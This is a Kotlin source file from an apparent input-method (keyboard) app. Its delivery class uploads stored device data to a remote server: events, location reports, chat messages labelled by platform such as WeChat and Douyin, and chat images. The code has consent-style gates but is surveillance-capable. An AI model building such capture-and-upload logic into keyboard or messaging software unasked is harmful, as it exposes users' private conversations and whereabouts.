package com.yuyan.imemodule.data.collect

import com.yuyan.imemodule.data.capture.notification.filterCallStatusNotifications
import com.yuyan.imemodule.data.capture.filterUnconfirmedTextMessages
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.booleanOrNull
import kotlinx.serialization.json.intOrNull
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CancellationException

/** 每个目标独立确认；网络调用只能由 IO 线程调用，失败保持数据库原状。 */
internal class EventDelivery(
    private val store: LocalInputStore,
    private val http: OkHttpClient,
    private val deviceId: String,
    private val deviceJson: String,
    private val onlineTarget: () -> String? = { null },
    private val allowed: (String?) -> Boolean = { true },
    private val maxImageBytes: (String) -> Long = { Long.MAX_VALUE },
    private val beginImageRead: () -> java.io.Closeable? = { java.io.Closeable {} },
    private val chatAllowed: (String) -> Boolean = { true },
    private val prepareChatCall: ((String, Request) -> okhttp3.Call?)? = null,
    private val finishChatCall: (okhttp3.Call) -> Unit = {},
    private val onChatDelivery: (String, String) -> Unit = { _, _ -> },
    private val tryStartImage: (String, Long) -> java.io.Closeable? = { _, _ -> java.io.Closeable {} },
) {
    private val locks = ConcurrentHashMap<String, Any>()
    private val registered = java.util.Collections.newSetFromMap(ConcurrentHashMap<String, Boolean>())
    private val reportsFirstNext = java.util.Collections.newSetFromMap(ConcurrentHashMap<String, Boolean>())
    private val json = Json { ignoreUnknownKeys = true }

    /** 小批次串行补传；空队列、无进展或失败立即结束，避免忙循环与全量加载。 */
    fun drain(
        target: String,
        maxBatches: Int = 100,
        nowMillis: () -> Long = { System.nanoTime() / 1_000_000 },
        beforeBatch: () -> Unit = {},
        beforeRequest: () -> Unit = {},
        selection: DeliverySelection = DeliverySelection(),
    ): Boolean = synchronized(locks.getOrPut(target) { Any() }) {
        require(maxBatches > 0)
        val started = nowMillis()
        repeat(maxBatches) { batch ->
            if (batch > 0 && nowMillis() - started >= 5_000) return@synchronized true
            beforeBatch() // 取消必须传播，不能在网络失败捕获中吞掉。
            var acknowledged = 0
            val ok = flushBatch(target, selection, canStartRequest = {
                beforeRequest()
                nowMillis() - started < 5_000
            }) { acknowledged += it }
            if (!ok) return@synchronized false
            if (acknowledged == 0) return@synchronized true
        }
        true
    }

    fun flush(target: String, selection: DeliverySelection = DeliverySelection()): Boolean = synchronized(locks.getOrPut(target) { Any() }) {
        flushBatch(target, selection) {}
    }

    private fun flushBatch(
        target: String,
        selection: DeliverySelection,
        canStartRequest: () -> Boolean = { true },
        confirmed: (Int) -> Unit,
    ): Boolean {
        return try {
            if (!allowed(null)) return false
            if (!canStartRequest()) return true
            if (target !in registered) {
                ReportingTrace.record(ReportingStage.REGISTER, target == onlineTarget())
                if (!post(target, "/api/v1/mobile/device", deviceJson)) return false
                registered.add(target)
            }
            // 两类队列轮换先手，防止慢失败总是耗尽5秒预算、饿死另一类。
            val reportsFirst = reportsFirstNext.remove(target)
            if (!reportsFirst) reportsFirstNext.add(target)
            val eventsOk = if (reportsFirst || !selection.events) true else flushEvents(target, canStartRequest, confirmed)
            var reportsOk = true
            ReportingTrace.record(ReportingStage.READ_REPORTS, target == onlineTarget())
            val reports = store.pendingReports(target, includeLocation = allowed("location"),
                maxImageBytes = { maxImageBytes(target) },
                includeChat = (onlineTarget() == null || target == onlineTarget()) && chatAllowed(target), beginImageRead = beginImageRead,
                selection = selection)
            ReportingTrace.record(ReportingStage.REPORTS_READY, target == onlineTarget(), reports.size)
            for (report in reports) {
                if (!allowed(report.kind)) continue
                if (!canStartRequest()) return eventsOk && reportsOk
                val diagnosticPlatform = if (report.kind == "chat_messages" && (onlineTarget() == null || onlineTarget() == target)) runCatching {
                    (json.parseToJsonElement(report.payload).jsonObject["conversation"] as? kotlinx.serialization.json.JsonObject)
                        ?.get("platform")?.jsonPrimitive?.content?.takeIf { it in setOf("wechat", "douyin") }
                }.getOrNull() else null
                var imagePermit: java.io.Closeable? = null
                val sent = try {
                    val path = when (report.kind) {
                        "chat_asset" -> "/api/v1/mobile/chat/assets"
                        "chat_messages" -> "/api/v1/mobile/chat/messages/batch"
                        else -> "/api/v1/mobile/reports"
                    }
                    val isChat = report.kind.startsWith("chat_")
                    val payload = if (report.kind == "chat_messages") {
                        val filtered = filterCallStatusNotifications(json.parseToJsonElement(report.payload).jsonObject)
                            ?.let(::filterUnconfirmedTextMessages)
                        if (filtered == null) {
                            // 取消该目标的无用待传任务；不传 onlineTarget，不写远端确认时间。
                            store.acknowledgeReports(target, listOf(report.id))
                            confirmed(1)
                            continue
                        }
                        filtered.toString()
                    } else if (isChat) report.payload else buildJsonObject {
                        put("id", report.id); put("kind", report.kind); put("payload", json.parseToJsonElement(report.payload))
                    }.toString()
                    if (report.kind == "chat_asset") {
                        // 读取队列后可能再次开始打字；暂停不是失败，不改变重试次序。
                        imagePermit = tryStartImage(target, payload.toByteArray(Charsets.UTF_8).size.toLong())
                            ?: continue
                    }
                    diagnosticPlatform?.let { runCatching { onChatDelivery(it, "waiting") } }
                    post(target, path, payload, if (isChat) null else report.id,
                        chatReportId = if (report.kind == "chat_messages") report.id else null)
                } catch (cancelled: CancellationException) { throw cancelled }
                catch (_: Exception) {
                    ReportingTrace.record(ReportingStage.DELIVERY_ERROR, target == onlineTarget())
                    false
                } finally {
                    imagePermit?.close()
                }
                diagnosticPlatform?.let { runCatching { onChatDelivery(it, if (sent) "acknowledged" else if (!chatAllowed(target)) "waiting" else "failed") } }
                if (sent) {
                    store.acknowledgeReports(target, listOf(report.id), onlineTarget())
                    confirmed(1)
                    ReportingTrace.record(ReportingStage.STORE_ACK, target == onlineTarget(), 1)
                }
                else {
                    store.deferReport(target, report.id) // 保留失败项，但给后续正常报告发送机会。
                    reportsOk = false
                }
            }
            val finalEventsOk = if (reportsFirst && selection.events) flushEvents(target, canStartRequest, confirmed) else eventsOk
            finalEventsOk && reportsOk
        } catch (cancelled: CancellationException) { throw cancelled } catch (_: Exception) {
            ReportingTrace.record(ReportingStage.DELIVERY_ERROR, target == onlineTarget())
            false
        }
    }
    private fun flushEvents(target: String, canStartRequest: () -> Boolean, confirmed: (Int) -> Unit): Boolean {
        ReportingTrace.record(ReportingStage.READ_EVENTS, target == onlineTarget())
        var eventsOk = true
        // 事件与聊天是独立队列；事件接口或单个事件异常不能阻塞聊天补传。
        try {
            val pending = store.pending(target)
            if (pending.isNotEmpty() && allowed("events")) {
                val batch = boundedEventBatch(pending)
                // 保留超大事件，不截断或假确认。
                if (batch.isEmpty()) eventsOk = false
                else {
                    val body = json.encodeToString(EventBatch.serializer(), EventBatch(deviceId, batch))
                    if (!canStartRequest()) return true
                    if (post(target, "/api/v1/mobile/events/batch", body, expectedEvents = batch.size)) {
                        store.acknowledge(target, batch.map { it.id }, onlineTarget())
                        confirmed(batch.size)
                        ReportingTrace.record(ReportingStage.STORE_ACK, target == onlineTarget(), batch.size)
                    } else eventsOk = false
                }
            }
        } catch (cancelled: CancellationException) { throw cancelled }
        catch (_: Exception) {
            ReportingTrace.record(ReportingStage.DELIVERY_ERROR, target == onlineTarget())
            eventsOk = false
        }
        return eventsOk
    }

    /** Include the JSON envelope, escaping, commas and UTF-8 bytes, not Kotlin character counts. */
    private fun boundedEventBatch(pending: List<MobileEvent>): List<MobileEvent> {
        val budget = 1024 * 1024 // Stay well below both the server JSON limit and proxy limits.
        var bytes = json.encodeToString(EventBatch.serializer(), EventBatch(deviceId, emptyList()))
            .toByteArray(Charsets.UTF_8).size
        var count = 0
        for (event in pending) {
            val eventBytes = json.encodeToString(MobileEvent.serializer(), event).toByteArray(Charsets.UTF_8).size
            val addition = eventBytes + if (count == 0) 0 else 1
            if (addition > budget - bytes) break
            bytes += addition
            count++
        }
        return pending.take(count)
    }

    private fun post(target: String, path: String, body: String, reportId: String? = null, expectedEvents: Int? = null, chatReportId: String? = null): Boolean {
        val stage = when (path) {
            "/api/v1/mobile/device" -> ReportingStage.POST_DEVICE
            "/api/v1/mobile/events/batch" -> ReportingStage.POST_EVENTS
            "/api/v1/mobile/chat/assets" -> ReportingStage.POST_ASSET
            "/api/v1/mobile/chat/messages/batch" -> ReportingStage.POST_MESSAGES
            else -> ReportingStage.POST_OTHER
        }
        ReportingTrace.record(stage, target == onlineTarget())
        val request = Request.Builder().url(target + path).header("X-Device-Id", deviceId)
            .post(body.toRequestBody("application/json; charset=utf-8".toMediaType())).build()
        val chat = path.startsWith("/api/v1/mobile/chat/")
        val call = if (chat && prepareChatCall != null) prepareChatCall.invoke(target, request) ?: return false else http.newCall(request)
        try { return call.execute().use { response ->
            ReportingTrace.record(ReportingStage.HTTP_RESULT, target == onlineTarget(), response.code)
            if (response.code == 401 || response.code == 403) registered.remove(target)
            if (response.code == 409 && chatReportId != null) {
                val source = response.body?.source()
                // 不截断 JSON 后猜测缺图；超限、畸形或陌生引用全部保留待传。
                val missing = if (source != null && !source.request(65_537)) missingAssets(source.readUtf8(), body) else emptySet()
                val restored = store.requeueMissingChatAssets(target, chatReportId, missing)
                android.util.Log.i("ChatAssetRecovery", "missing_assets requested=${missing.size} recoverable=$restored")
                return@use false
            }
            // 避免把反向代理返回的 200 HTML 登录页当成入库成功。
            if (!response.isSuccessful) false else {
                val result = json.parseToJsonElement(response.body?.string() ?: "")
                (result.jsonObject["ok"]?.jsonPrimitive?.booleanOrNull == true &&
                    allowed(if (chat) if (chatReportId != null) "chat_messages" else "chat_asset" else null) &&
                    (!chat || chatAllowed(target)) &&
                    result.jsonObject["discarded"]?.jsonPrimitive?.booleanOrNull != true &&
                    (expectedEvents == null || result.jsonObject["received"]?.jsonPrimitive?.intOrNull == expectedEvents) &&
                    (reportId == null || result.jsonObject["id"]?.jsonPrimitive?.content == reportId)).also {
                    ReportingTrace.record(ReportingStage.ACK_RESULT, target == onlineTarget(), flag = it)
                }
            }
        } } finally { if (chat) finishChatCall(call) }
    }

    private fun missingAssets(response: String, request: String): Set<String> = try {
        val hashes = (json.parseToJsonElement(response) as? JsonObject)?.get("missingAssets") as? JsonArray
        require(hashes != null && hashes.size in 1..512)
        val validHash = Regex("[a-fA-F0-9]{64}")
        val missing = hashes.map {
            require(it is JsonPrimitive && it.isString && validHash.matches(it.content))
            it.content
        }.toSet()
        val messages = json.parseToJsonElement(request).jsonObject["messages"] as? JsonArray
        val declared = messages.orEmpty().flatMap { message ->
            (message.jsonObject["asset_sha256"] as? JsonArray).orEmpty().map { it.jsonPrimitive.content }
        }.toSet()
        missing.intersect(declared)
    } catch (_: Exception) { emptySet() }
}
